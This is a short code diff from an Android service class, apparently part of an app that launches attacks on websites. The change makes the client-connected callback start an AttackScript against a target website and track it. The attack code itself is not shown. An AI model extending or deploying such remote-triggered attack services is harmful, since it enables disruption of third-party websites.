@@ -72,8 +72,6 @@ public class AttackService extends Service implements Client.ClientConnectionLis
         } else {
             Toast.makeText(this, R.string.already_attacking_label, Toast.LENGTH_SHORT).show();
         }
-//        Future future = executor.submit(new AttackScript(attack.getWebsite()));
-//        tasks.put(attack.getPushId(), future);
     }
 
     @NonNull
@@ -99,7 +97,9 @@ public class AttackService extends Service implements Client.ClientConnectionLis
 
     @Override
     public void onClientConnected(Client thisClient, Attack attack) {
-
+        clients.put(attack.getPushId(), thisClient);
+        Future future = executor.submit(new AttackScript(attack.getWebsite()));
+        tasks.put(attack.getPushId(), future);
     }
 
     @Override
